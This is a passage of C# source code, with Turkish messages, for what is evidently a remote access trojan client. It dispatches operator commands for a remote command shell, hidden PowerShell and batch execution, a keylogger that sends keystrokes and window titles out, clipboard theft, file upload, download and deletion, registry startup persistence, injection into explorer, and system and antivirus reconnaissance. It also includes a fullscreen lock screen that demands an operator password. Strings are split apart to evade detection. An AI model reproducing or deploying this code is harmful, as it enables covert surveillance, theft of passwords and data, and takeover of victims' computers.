                catch { CHATSTART = false; }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        static void ChatAdd(string text)
        {
            try
            {
                if (CHATLOG == null || CHATLOG.IsDisposed) { ChatOpen(CHATOP); Thread.Sleep(450); }
                if (CHATLOG != null && !CHATLOG.IsDisposed)
                    CHATLOG.BeginInvoke((MethodInvoker)delegate
                    {
                        CHATLOG.AppendText(CHATOP + "": "" + text + ""\r\n"");
                        CHATLOG.SelectionStart = CHATLOG.Text.Length;
                        CHATLOG.ScrollToCaret();
                    });
            }
            catch { }
        }

        static void ChatClose()
        {
            CHATFORCE = true;
            try
            {
                if (CHATF != null && !CHATF.IsDisposed)
                    CHATF.BeginInvoke((MethodInvoker)delegate { try { CHATF.Close(); } catch { } });
            }
            catch { }
        }
#endif

#if FEATURE_CLIPBOARD
        static void ClipSet(string text)
        {
            var t = new Thread(() =>
            {
                try { Clipboard.SetText(text); Send(""INFO|Pano güncellendi.""); }
                catch { Send(""INFO|Pano yazılamadı.""); }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        static void ClipGet()
        {
            var t = new Thread(() =>
            {
                try
                {
                    string txt = Clipboard.ContainsText() ? Clipboard.GetText() : """";
                    Send(""CLIP|"" + B64(txt));
                }
                catch { Send(""CLIP|"" + B64("""")); }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }
#endif

        static void Wallpaper(string b64)
        {
            try
            {
                string file = Path.Combine(WorkDir(), FP + ""wall.jpg"");
                File.WriteAllBytes(file, Convert.FromBase64String(b64));
                Hide(file);
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, file, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                Send(""INFO|Duvar kağıdı değiştirildi."");
            }
            catch (Exception ex) { Send(""INFO|Duvar kağıdı hatası: "" + ex.Message); }
        }

        static void ToggleIcons()
        {
            try
            {
                IntPtr prog = FindWindow(""Prog"" + ""man"", null);
                IntPtr view = FindWindowEx(prog, IntPtr.Zero, ""SHELLDLL_"" + ""DefView"", null);
                if (view == IntPtr.Zero)
                {
                    IntPtr work = IntPtr.Zero;
                    while ((work = FindWindowEx(IntPtr.Zero, work, ""Work"" + ""erW"", null)) != IntPtr.Zero)
                    {
                        view = FindWindowEx(work, IntPtr.Zero, ""SHELLDLL_"" + ""DefView"", null);
                        if (view != IntPtr.Zero) break;
                    }
                }
                if (view == IntPtr.Zero) { Send(""INFO|Masaüstü bulunamadı.""); return; }

                IntPtr list = FindWindowEx(view, IntPtr.Zero, ""Sys"" + ""ListView32"", null);
                iconsHidden = !iconsHidden;
                ShowWindow(list, iconsHidden ? 0 : 5);
                Send(""INFO|"" + (iconsHidden ? ""İkonlar gizlendi."" : ""İkonlar gösterildi.""));
            }
            catch (Exception ex) { Send(""INFO|İkon hatası: "" + ex.Message); }
        }

        static void BeepIt()
        {
            var t = new Thread(() =>
            {
                try { for (int i = 0; i < 3; i++) { Console.Beep(880, 220); Thread.Sleep(120); } }
                catch { }
            });
            t.IsBackground = true;
            t.Start();
        }

        static void VolKey(byte vk)
        {
            try
            {
                keybd_event(vk, 0, 1, UIntPtr.Zero);
                keybd_event(vk, 0, 3, UIntPtr.Zero);
            }
            catch { }
        }

        static void MonOff()
        {
            try { SendMessage(FindWindow(""Prog"" + ""man"", null), WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)2); }
            catch { }
        }

        static void TrayToggle()
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    if (!trayOpen)
                    {
                        var sb = new StringBuilder(64);
                        if (mciSendString(""set cdaudio door open"", sb, 64, IntPtr.Zero) == 0)
                        {
                            trayOpen = true;
                            Send(""INFO|CD tepsi açıldı."");
                        }
                        else Send(""INFO|CD sürücü bulunamadı."");
                    }
                    else
                    {
                        mciSendString(""set cdaudio door closed"", null, 0, IntPtr.Zero);
                        trayOpen = false;
                        Send(""INFO|CD tepsi kapatıldı."");
                    }
                }
                catch { }
            });
        }

        static void TaskbarToggle()
        {
            try
            {
                IntPtr h = FindWindow(""Shell_"" + ""TrayWnd"", null);
                if (h == IntPtr.Zero) { Send(""INFO|Görev çubuğu bulunamadı.""); return; }
                taskbarHidden = !taskbarHidden;
                ShowWindow(h, taskbarHidden ? 0 : 5);
                Send(""INFO|"" + (taskbarHidden ? ""Görev çubuğu gizlendi."" : ""Görev çubuğu gösterildi.""));
            }
            catch (Exception ex) { Send(""INFO|Görev çubuğu hatası: "" + ex.Message); }
        }

        static void FullLock()
        {
            if (LOCKF != null && !LOCKF.IsDisposed)
            {
                try { LOCKF.BeginInvoke((MethodInvoker)delegate { LOCKF.Activate(); }); } catch { }
                return;
            }

            var t = new Thread(() =>
            {
                try
                {
                    var f = new Form
                    {
                        FormBorderStyle = FormBorderStyle.None,
                        WindowState = FormWindowState.Maximized,
                        StartPosition = FormStartPosition.Manual,
                        TopMost = true,
                        BackColor = Color.Black,
                        ForeColor = Color.White,
                        ShowInTaskbar = true,
                        KeyPreview = true,
                        Text = ""Sistem Kilitli""
                    };

                    var host = new TableLayoutPanel { Dock = DockStyle.Fill, RowCount = 3, ColumnCount = 1, BackColor = Color.Black };
                    host.RowStyles.Add(new RowStyle(SizeType.Percent, 44));
                    host.RowStyles.Add(new RowStyle(SizeType.Percent, 34));
                    host.RowStyles.Add(new RowStyle(SizeType.Percent, 22));

                    host.Controls.Add(new Label
                    {
                        Text = ""🔒"",
                        Dock = DockStyle.Fill,
                        TextAlign = ContentAlignment.MiddleCenter,
                        Font = new Font(""Segoe UI"", 62f),
                        ForeColor = Color.FromArgb(96, 148, 255),
                        BackColor = Color.Black
                    }, 0, 0);

                    host.Controls.Add(new Label
                    {
                        Text = ""Sistem kilitlendi.\nOperatör şifresi gerekli."",
                        Dock = DockStyle.Fill,
                        TextAlign = ContentAlignment.MiddleCenter,
                        Font = new Font(""Segoe UI"", 16f),
                        ForeColor = Color.Gainsboro,
                        BackColor = Color.Black
                    }, 0, 1);

                    var box = new FlowLayoutPanel { Dock = DockStyle.Fill, FlowDirection = FlowDirection.TopDown, WrapContents = false, BackColor = Color.Black };
                    var inp = new TextBox
                    {
                        Width = 320,
                        UseSystemPasswordChar = true,
                        Font = new Font(""Segoe UI"", 12f),
                        BorderStyle = BorderStyle.FixedSingle,
                        BackColor = Color.FromArgb(20, 20, 24),
                        ForeColor = Color.White,
                        Margin = new Padding(0, 24, 0, 0)
                    };
                    box.Controls.Add(inp);
                    host.Controls.Add(box, 0, 2);

                    f.Controls.Add(host);

                    inp.KeyDown += (s2, e2) =>
                    {
                        if (e2.KeyCode != Keys.Enter) return;
                        e2.SuppressKeyPress = true;
                        if (inp.Text == LOCKPASS) { LOCKOFF = true; f.Close(); }
                        else { inp.Clear(); Thread.Sleep(300); inp.Focus(); }
                    };

                    f.FormClosing += (s2, e2) => { if (!LOCKOFF) e2.Cancel = true; };
                    f.FormClosed += (s2, e2) => { LOCKF = null; LOCKOFF = false; };
                    f.Shown += (s2, e2) => { try { f.Activate(); inp.Focus(); } catch { } };

                    LOCKF = f;
                    Application.Run(f);
                }
                catch { }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        static void UnlockNow(string pass)
        {
            if (LOCKF == null || LOCKF.IsDisposed) { Send(""INFO|Kilit açık değil.""); return; }
            if (pass == LOCKPASS)
            {
                LOCKOFF = true;
                try { LOCKF.BeginInvoke((MethodInvoker)delegate { LOCKF.Close(); }); } catch { }
                Send(""INFO|Kilit açıldı."");
            }
            else Send(""INFO|Hatalı şifre."");
        }

#if FEATURE_FILEMGR
        static void ChunkPut(string path, int idx, int total, byte[] data)
        {
            try
            {
                MemoryStream ms;
                lock (CHUNKS)
                {
                    if (!CHUNKS.TryGetValue(path, out ms)) { ms = new MemoryStream(); CHUNKS[path] = ms; }
                }

                lock (ms) { ms.Seek((long)idx * 1048576L, SeekOrigin.Begin); ms.Write(data, 0, data.Length); }
                if (idx != total - 1) return;

                byte[] all;
                lock (ms) { all = ms.ToArray(); }
                lock (CHUNKS) CHUNKS.Remove(path);
                try { ms.Dispose(); } catch { }

                File.WriteAllBytes(path, all);
                Send(""FILE_MSG|Kaydedildi ("" + total + "" parça): "" + path);
            }
            catch (Exception ex) { Send(""FILE_ERR|"" + ex.Message); }
        }
#endif

#if FEATURE_CHAT
        static void Toast(string text)
        {
            var t = new Thread(() =>
            {
                try
                {
                    var f = new Form
                    {
                        FormBorderStyle = FormBorderStyle.None,
                        StartPosition = FormStartPosition.Manual,
                        Size = new Size(348, 86),
                        BackColor = Color.FromArgb(26, 30, 40),
                        TopMost = true,
                        ShowInTaskbar = false
                    };
                    var area = Screen.PrimaryScreen.WorkingArea;
                    f.Location = new Point(area.Right - f.Width - 18, area.Bottom - f.Height - 18);

                    f.Paint += (s, e) =>
                    {
                        using (var p = new Pen(Color.FromArgb(64, 120, 255))) e.Graphics.DrawRectangle(p, 0, 0, f.Width - 1, f.Height - 1);
                        using (var b = new SolidBrush(Color.FromArgb(64, 120, 255))) e.Graphics.FillRectangle(b, 0, 0, 4, f.Height);
                    };

                    f.Controls.Add(new Label { Text = ""Destek"", Left = 16, Top = 10, AutoSize = true, Font = new Font(""Segoe UI"", 8.5f, FontStyle.Bold), ForeColor = Color.FromArgb(120, 170, 255), BackColor = Color.Transparent });
                    f.Controls.Add(new Label { Text = text, Left = 16, Top = 32, Width = 316, Height = 44, ForeColor = Color.Gainsboro, BackColor = Color.Transparent });

                    var tm = new System.Windows.Forms.Timer { Interval = 4200 };
                    tm.Tick += (s, e) => { tm.Stop(); f.Close(); };
                    f.Shown += (s, e) => tm.Start();

                    Application.Run(f);
                }
                catch { }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }
#endif

        static void DrivesOut()
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                var sb = new StringBuilder();
                try
                {
                    foreach (var d in DriveInfo.GetDrives())
                    {
                        try
                        {
                            string label = d.IsReady ? d.VolumeLabel : """";
                            long total = d.IsReady ? d.TotalSize : 0;
                            long free = d.IsReady ? d.TotalFreeSpace : 0;
                            sb.AppendLine(d.Name + ""  |  "" + d.DriveType + ""  |  "" + d.DriveFormat + ""  |  "" + label + ""  |  "" + (total / 1073741824) + "" GB toplam  |  "" + (free / 1073741824) + "" GB boş"");
                        }
                        catch { sb.AppendLine(d.Name + ""  |  okunamadı""); }
                    }
                }
                catch (Exception ex) { sb.AppendLine(ex.Message); }
                Send(""DRIVES_OUT|"" + sb);
            });
        }

        static void EnvOut()
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                var sb = new StringBuilder();
                try
                {
                    foreach (System.Collections.DictionaryEntry e in Environment.GetEnvironmentVariables())
                        sb.AppendLine(e.Key + "" = "" + e.Value);
                }
                catch (Exception ex) { sb.AppendLine(ex.Message); }
                Send(""ENV_OUT|"" + sb);
            });
        }

        static void HostsOut()
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), ""drivers"" + ""\\etc\\ho"" + ""sts"");
                    Send(""HOSTS_OUT|"" + (File.Exists(p) ? File.ReadAllText(p) : ""hosts dosyası bulunamadı.""));
                }
                catch (Exception ex) { Send(""HOSTS_OUT|"" + ex.Message); }
            });
        }

        static void SoftList()
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                var sb = new StringBuilder();
                string[] roots =
                {
                    ""SOFT"" + ""WARE\\Micro"" + ""soft\\Windows\\Current"" + ""Version\\Unin"" + ""stall"",
                    ""SOFT"" + ""WARE\\WOW"" + ""6432Node\\Micro"" + ""soft\\Windows\\Current"" + ""Version\\Unin"" + ""stall""
                };
                foreach (string root in roots)
                {
                    try
                    {
                        using (var k = Registry.LocalMachine.OpenSubKey(root))
                        {
                            if (k == null) continue;
                            foreach (string sub in k.GetSubKeyNames())
                            {
                                try
                                {
                                    using (var sk = k.OpenSubKey(sub))
                                    {
                                        if (sk == null) continue;
                                        string name = Convert.ToString(sk.GetValue(""DisplayName""));
                                        if (string.IsNullOrEmpty(name)) continue;
                                        sb.AppendLine(name + ""  |  "" + Convert.ToString(sk.GetValue(""DisplayVersion"")) + ""  |  "" + Convert.ToString(sk.GetValue(""Publisher"")));
                                    }
                                }
                                catch { }
                            }
                        }
                    }
                    catch { }
                }
                Send(""SOFT_OUT|"" + sb);
            });
        }

#if FEATURE_FILEMGR
        static void FileSearch(string root, string pattern)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                var sb = new StringBuilder();
                try
                {
                    foreach (string f in Directory.EnumerateFiles(root, pattern, SearchOption.AllDirectories))
                    {
                        sb.AppendLine(f);
                        if (sb.Length > 60000) break;
                    }
                }
                catch (Exception ex) { sb.AppendLine(""Hata: "" + ex.Message); }
                Send(""SEARCH_OUT|"" + sb);
            });
        }

        static void FileListAsync(string path)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var sb = new StringBuilder();
                    var di = new DirectoryInfo(path);
                    foreach (var d in di.GetDirectories())
                        sb.Append(""D~"" + d.Name + ""~"" + d.LastWriteTime.ToString(""yyyy-MM-dd HH:mm"") + ""~0|"");
                    foreach (var f in di.GetFiles())
                        sb.Append(""F~"" + f.Name + ""~"" + f.LastWriteTime.ToString(""yyyy-MM-dd HH:mm"") + ""~"" + f.Length + ""|"");
                    Send(""FILE_LIST|"" + sb);
                }
                catch (Exception ex) { Send(""FILE_LIST|ERROR|"" + ex.Message); }
            });
        }
#endif

        static void RunDirect(string line)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try { Process.Start(new ProcessStartInfo(line) { UseShellExecute = true }); }
                catch (Exception ex) { Send(""INFO|Çalıştırma hatası: "" + ex.Message); }
            });
        }

        static void ProcListAsync()
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                var sb = new StringBuilder();
                foreach (var p in Process.GetProcesses())
                {
                    try { sb.Append(p.Id + ""~"" + p.ProcessName + ""~"" + p.MainWindowTitle + ""|""); } catch { }
                }
                Send(""PROC_LIST|"" + sb);
            });
        }

#if FEATURE_REGISTRY
        static void RegReadAsync(string path)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    using (var k = Registry.CurrentUser.OpenSubKey(path) ?? Registry.LocalMachine.OpenSubKey(path))
                    {
                        if (k == null) { Send(""REG_OUT|ERROR|Anahtar yok.""); return; }
                        var sb = new StringBuilder();
                        foreach (string v in k.GetValueNames()) sb.Append(v + "" = "" + k.GetValue(v) + ""~|"");
                        Send(""REG_OUT|"" + sb);
                    }
                }
                catch (Exception ex) { Send(""REG_OUT|ERROR|"" + ex.Message); }
            });
        }

        static void StartupListAsync()
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                var sb = new StringBuilder();
                try
                {
                    using (var k = Registry.CurrentUser.OpenSubKey(RUN_KEY))
                        if (k != null) foreach (string n in k.GetValueNames()) sb.Append(n + ""~"" + k.GetValue(n) + ""|"");
                }
                catch { }
                Send(""STARTUP_OUT|"" + sb);
            });
        }
#endif

        static void KeysAsync(string text)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                foreach (char ch in text)
                {
                    short v = VkKeyScan(ch);
                    if (v == -1) continue;
                    byte vk = (byte)(v & 0xFF);
                    bool shift = (v & 0x100) != 0;
                    if (shift) keybd_event(0x10, 0, 0, UIntPtr.Zero);
                    keybd_event(vk, 0, 0, UIntPtr.Zero);
                    keybd_event(vk, 0, 2, UIntPtr.Zero);
                    if (shift) keybd_event(0x10, 0, 2, UIntPtr.Zero);
                    Thread.Sleep(12);
                }
            });
        }

#if FEATURE_KEYLOG
        static GetAsyncKeyFn _fnKey;
        static ToUnicodeExFn _fnUni;

        static void LoadInput()
        {
            if (_fnKey != null) return;
            string u = ""use"" + ""r32.dll"";
            _fnKey = (GetAsyncKeyFn)Api.Get(u, ""GetAsync"" + ""KeyState"", typeof(GetAsyncKeyFn));
            _fnUni = (ToUnicodeExFn)Api.Get(u, ""ToUni"" + ""codeEx"", typeof(ToUnicodeExFn));
        }

        static string VkText(int vk)
        {
            if (vk == 8) return ""[BS]"";
            if (vk == 9) return ""[TAB]"";
            if (vk == 13) return ""\r\n"";
            if (vk == 27) return ""[ESC]"";
            if (vk == 32) return "" "";
            if (vk == 160 || vk == 161) return """";
            if (vk >= 112 && vk <= 123) return ""[F"" + (vk - 111) + ""]"";
            if (vk >= 37 && vk <= 40) return ""[YON]"";
            if (vk == 46) return ""[DEL]"";

            try
            {
                LoadInput();
                if (_fnUni == null) return null;

                byte[] st = new byte[256];
                GetKeyboardState(st);
                var sb = new StringBuilder(8);
                int pid;
                IntPtr lay = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out pid));
                int n = _fnUni((uint)vk, 0, st, sb, 8, 0, lay);
                if (n > 0) return sb.ToString(0, n);
            }
            catch { }
            return null;
        }

        static void KlLoop(int g)
        {
            string lastWin = null;
            LoadInput();

            while (alive && GEN == g && klRun)
            {
                Thread.Sleep(45);
                try
                {
                    var tb = new StringBuilder(256);
                    GetWindowText(GetForegroundWindow(), tb, 256);
                    string title = tb.ToString();
                    if (title != lastWin)
                    {
                        lastWin = title;
                        if (title.Length > 0) Send(""KEYLOG|["" + title.Replace(""|"", ""/"") + ""]"");
                    }
                }
                catch { }

                if (_fnKey == null) continue;

                for (int vk = 8; vk < 255; vk++)
                {
                    if ((_fnKey(vk) & 0x8000) == 0) continue;
                    string t = VkText(vk);
                    if (t == null) continue;
                    Send(""KEYLOG|"" + t.Replace(""|"", ""/""));
                    LogLine(""keys.txt"", t);
                }
            }
        }
#endif

#if FEATURE_CLIPBOARD
        static void ClLoop(int g)
        {
            string last = null;
            while (alive && GEN == g && clRun)
            {
                Thread.Sleep(700);
                try
                {
                    string t = Clipboard.ContainsText() ? Clipboard.GetText() : null;
                    if (t == null || t == last) continue;
                    last = t;
                    Send(""CLIP|"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(t)));
                    LogLine(""clip.txt"", t + ""\r\n----\r\n"");
                }
                catch { }
            }
        }
#endif

#if FEATURE_RD
        static void StartRd()
        {
            if (rdRun) return;
            rdRun = true;
            int g = GEN;
            new Thread(() => RdLoop(g)) { IsBackground = true }.Start();
        }
#endif

#if FEATURE_KEYLOG
        static void StartKl()
        {
            if (klRun) return;
            klRun = true;
            int g = GEN;
            new Thread(() => KlLoop(g)) { IsBackground = true }.Start();
        }
#endif

#if FEATURE_CLIPBOARD
        static void StartCl()
        {
            if (clRun) return;
            clRun = true;
            int g = GEN;
            var t = new Thread(() => ClLoop(g)) { IsBackground = true };
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }
#endif

        static void PassRecovery()
        {
            Send(""INFO|Veri toplama sunucu tarafında çalışıyor."");
        }

        static Encoding Oem()
        {
            try { return Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage); }
            catch { return Encoding.Default; }
        }

#if FEATURE_SCRIPT
        static void ScriptRun(string kind, string code)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                string tmp = null;
                try
                {
                    ProcessStartInfo psi;
                    if (kind == ""PS"")
                    {
                        psi = new ProcessStartInfo(""pow"" + ""er"" + ""shell.exe"",
                            ""-NoProfile -NonInteractive -Command -"")
                        {
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            RedirectStandardInput = true,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            StandardOutputEncoding = Oem(),
                            StandardErrorEncoding = Oem()
                        };
                    }
                    else
                    {
                        tmp = WorkFile("".bat"");
                        File.WriteAllText(tmp, code, Encoding.Default);
                        Hide(tmp);
                        psi = new ProcessStartInfo(""cm"" + ""d.exe"", ""/c "" + Q(tmp))
                        {
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            StandardOutputEncoding = Oem(),
                            StandardErrorEncoding = Oem()
                        };
                    }

                    using (var p = Process.Start(psi))
                    {
                        if (kind == ""PS"")
                        {
                            try
                            {
                                p.StandardInput.Write(code);
                                if (!code.EndsWith(""\n"")) p.StandardInput.Write(""\n"");
                                p.StandardInput.Close();
                            }
                            catch { }
                        }
                        string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                        p.WaitForExit(120000);
                        Send(""SCRIPT_OUT|"" + o);
                    }
                }
                catch (Exception ex) { Send(""SCRIPT_OUT|Hata: "" + ex.Message); }
                finally { if (tmp != null) { try { File.Delete(tmp); } catch { } } }
            });
        }
#endif

        static string DecodeBody(string cmd, int offset)
        {
            try { return Encoding.UTF8.GetString(Convert.FromBase64String(cmd.Substring(offset))); }
            catch { return cmd.Substring(offset); }
        }

        static void Dispatch(string cmd)
        {
            if (cmd.Length == 0) return;

#if FEATURE_SHELL
            if (cmd.StartsWith(""SHELL|""))
            {
                string c = cmd.Substring(6);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        var psi = new ProcessStartInfo(""cm"" + ""d.exe"", ""/c "" + c)
                        {
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            CreateNoWindow = true,
                            StandardOutputEncoding = Oem(),
                            StandardErrorEncoding = Oem()
                        };
                        using (var p = Process.Start(psi))
                        {
                            string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                            Send(""SHELL_OUT|"" + o);
                        }
                    }
                    catch (Exception ex) { Send(""SHELL_OUT|Hata: "" + ex.Message); }
                });
                return;
            }
#endif

#if FEATURE_SCRIPT
            if (cmd.StartsWith(""SCRIPT|PS|"")) { ScriptRun(""PS"", DecodeBody(cmd, 10)); return; }
            if (cmd.StartsWith(""SCRIPT|BAT|"")) { ScriptRun(""BAT"", DecodeBody(cmd, 11)); return; }
#endif

            if (cmd.StartsWith(""RUN|"")) { RunDirect(cmd.Substring(4)); return; }

#if FEATURE_CLIPBOARD
            if (cmd.StartsWith(""CLIPSET|"")) { ClipSet(DecodeBody(cmd, 8)); return; }
#endif

            if (cmd.StartsWith(""WALLPAPER|"")) { Wallpaper(cmd.Substring(10)); return; }
            if (cmd == ""HIDEICONS"") { ToggleIcons(); return; }
            if (cmd == ""BEEP"") { BeepIt(); return; }

#if FEATURE_RD
            if (cmd == ""SHOT"") { ShotOnce(); return; }
#endif

            if (cmd.StartsWith(""ECHO|"")) { Send(""ECHO|"" + cmd.Substring(5)); return; }

#if FEATURE_CHAT
            if (cmd.StartsWith(""CHAT|OPEN|"")) { ChatOpen(U64(cmd.Substring(10))); return; }
            if (cmd == ""CHAT|OPEN"") { ChatOpen(""Operatör""); return; }
            if (cmd.StartsWith(""CHAT|MSG|"")) { ChatAdd(U64(cmd.Substring(9))); return; }
            if (cmd == ""CHAT|CLOSE"") { ChatClose(); return; }
            if (cmd.StartsWith(""CHAT|"")) { ChatAdd(cmd.Substring(5)); return; }
            if (cmd.StartsWith(""TOAST|"")) { Toast(U64(cmd.Substring(6))); return; }
#endif

            if (cmd == ""VOL|UP"") { VolKey(0xAF); return; }
            if (cmd == ""VOL|DOWN"") { VolKey(0xAE); return; }
            if (cmd == ""VOL|MUTE"") { VolKey(0xAD); return; }
            if (cmd == ""MONITOR|OFF"") { MonOff(); return; }
            if (cmd == ""LOCK"") { try { LockWorkStation(); } catch { } return; }
            if (cmd == ""LOCK|FULLSCREEN"") { FullLock(); return; }
            if (cmd.StartsWith(""UNLOCK|"")) { UnlockNow(cmd.Substring(7)); return; }

#if FEATURE_INJECT
            if (cmd == ""INJECT"") { ThreadPool.QueueUserWorkItem(_ => AttachToExplorer()); return; }
#endif

            if (cmd == ""CD"") { TrayToggle(); return; }
            if (cmd == ""TASKBAR"") { TaskbarToggle(); return; }

#if FEATURE_CLIPBOARD
            if (cmd == ""CLIP|GET"") { ClipGet(); return; }
#endif

            if (cmd == ""DRIVES"") { DrivesOut(); return; }
            if (cmd == ""ENV"") { EnvOut(); return; }
            if (cmd == ""HOSTS"") { HostsOut(); return; }
            if (cmd == ""SOFT|LIST"") { SoftList(); return; }
            if (cmd == ""DNS|FLUSH"") { ThreadPool.QueueUserWorkItem(_ => Run(""ip"" + ""con"" + ""fig"", ""/flushdns"")); return; }

#if FEATURE_FILEMGR
            if (cmd.StartsWith(""FILE|SEARCH|""))
            {
                string rest = cmd.Substring(12);
                int i = rest.IndexOf('|');
                if (i > 0) FileSearch(rest.Substring(0, i), rest.Substring(i + 1));
                return;
            }
#endif

            if (cmd.StartsWith(""PROC|START|""))
            {
                string p = cmd.Substring(11);
                ThreadPool.QueueUserWorkItem(_ => { try { Process.Start(p); } catch { } });
                return;
            }

#if FEATURE_FILEMGR
            if (cmd.StartsWith(""FILE|LIST|"")) { FileListAsync(cmd.Substring(10)); return; }

            if (cmd.StartsWith(""FILE|GET|""))
            {
                string path = cmd.Substring(9);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        var fi = new FileInfo(path);
                        if (fi.Length > 60L * 1024 * 1024) { Send(""FILE_ERR|Dosya 60MB'tan büyük.""); return; }
                        Send(""FILE_DATA|"" + fi.Name + ""|"" + Convert.ToBase64String(File.ReadAllBytes(path)));
                    }
                    catch (Exception ex) { Send(""FILE_ERR|"" + ex.Message); }
                });
                return;
            }

            if (cmd.StartsWith(""FILE|PUT_CHUNK|""))
            {
                string[] p = cmd.Substring(15).Split(new[] { '|' }, 4);
                int idx, total;
                if (p.Length == 4 && int.TryParse(p[1], out idx) && int.TryParse(p[2], out total))
                {
                    byte[] data;
                    try { data = Convert.FromBase64String(p[3]); } catch { data = new byte[0]; }
                    string path = p[0];
                    ThreadPool.QueueUserWorkItem(_ => ChunkPut(path, idx, total, data));
                }
                return;
            }

            if (cmd.StartsWith(""FILE|PUT|""))
            {
                string rest = cmd.Substring(9);
                int i = rest.IndexOf('|');
                if (i > 0)
                {
                    string path = rest.Substring(0, i);
                    string b64 = rest.Substring(i + 1);
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        try
                        {
                            File.WriteAllBytes(path, Convert.FromBase64String(b64));
                            Send(""FILE_MSG|Kaydedildi: "" + path);
                        }
                        catch (Exception ex) { Send(""FILE_ERR|"" + ex.Message); }
                    });
                }
                return;
            }

            if (cmd.StartsWith(""FILE|MD|""))
            {
                string p = cmd.Substring(8);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try { Directory.CreateDirectory(p); Send(""FILE_MSG|Klasör oluşturuldu: "" + p); }
                    catch (Exception ex) { Send(""FILE_ERR|"" + ex.Message); }
                });
                return;
            }

            if (cmd.StartsWith(""FILE|DEL|""))
            {
                string p = cmd.Substring(9);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        if (Directory.Exists(p)) Directory.Delete(p, true);
                        else File.Delete(p);
                        Send(""FILE_MSG|Silindi: "" + p);
                    }
                    catch (Exception ex) { Send(""FILE_ERR|"" + ex.Message); }
                });
                return;
            }
#endif

            if (cmd == ""PROC|LIST"") { ProcListAsync(); return; }
            if (cmd.StartsWith(""PROC|KILL|""))
            {
                string pid = cmd.Substring(10);
                ThreadPool.QueueUserWorkItem(_ => { try { Process.GetProcessById(int.Parse(pid)).Kill(); } catch { } });
                return;
            }

            if (cmd == ""SYSINFO"")
            {
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    var sb = new StringBuilder();
                    sb.AppendLine(""Kullanıcı : "" + Environment.UserName);
                    sb.AppendLine(""Makine    : "" + Environment.MachineName);
                    sb.AppendLine(""Admin     : "" + IsAdmin());
                    sb.AppendLine(""OS        : "" + Environment.OSVersion);
                    sb.AppendLine(""64-bit    : "" + Environment.Is64BitOperatingSystem);
                    sb.AppendLine(""CPU       : "" + Environment.ProcessorCount + "" çekirdek"");
#if FEATURE_RECON
                    sb.AppendLine(""RAM       : "" + RamGb());
                    sb.AppendLine(""AntiVirüs : "" + AvName());
                    sb.AppendLine(""Kamera    : "" + CamCount());
                    sb.AppendLine(""Monitör   : "" + MonCount());
#endif
                    sb.AppendLine(""Çalışma   : "" + TimeSpan.FromMilliseconds(Math.Abs(Environment.TickCount)));
                    try
                    {
                        foreach (var d in DriveInfo.GetDrives())
                            if (d.IsReady) sb.AppendLine(""Disk "" + d.Name + "" : "" + (d.TotalFreeSpace / 1073741824) + "" GB boş / "" + (d.TotalSize / 1073741824) + "" GB"");
                    }
                    catch { }
                    Send(""SYSINFO_OUT|"" + sb);
                });
                return;
            }

#if FEATURE_REGISTRY
            if (cmd.StartsWith(""REG|READ|"")) { RegReadAsync(cmd.Substring(9)); return; }
            if (cmd == ""STARTUP|LIST"") { StartupListAsync(); return; }
            if (cmd.StartsWith(""STARTUP|ADD|""))
            {
                string rest = cmd.Substring(12);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    string[] p = rest.Split(new[] { '|' }, 2);
                    if (p.Length == 2)
                    {
                        try
                        {
                            using (var k = Registry.CurrentUser.OpenSubKey(RUN_KEY, true))
                                if (k != null) k.SetValue(p[0], p[1]);
                            Send(""STARTUP_OUT|OK"");
                        }
                        catch (Exception ex) { Send(""STARTUP_OUT|ERROR|"" + ex.Message); }
                    }
                });
                return;
            }
            if (cmd.StartsWith(""STARTUP|DEL|""))
            {
                string name = cmd.Substring(12);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        using (var k = Registry.CurrentUser.OpenSubKey(RUN_KEY, true))
                            if (k != null) k.DeleteValue(name, false);
                        Send(""STARTUP_OUT|OK"");
                    }
                    catch (Exception ex) { Send(""STARTUP_OUT|ERROR|"" + ex.Message); }
                });
                return;
            }
#endif

#if FEATURE_KEYLOG
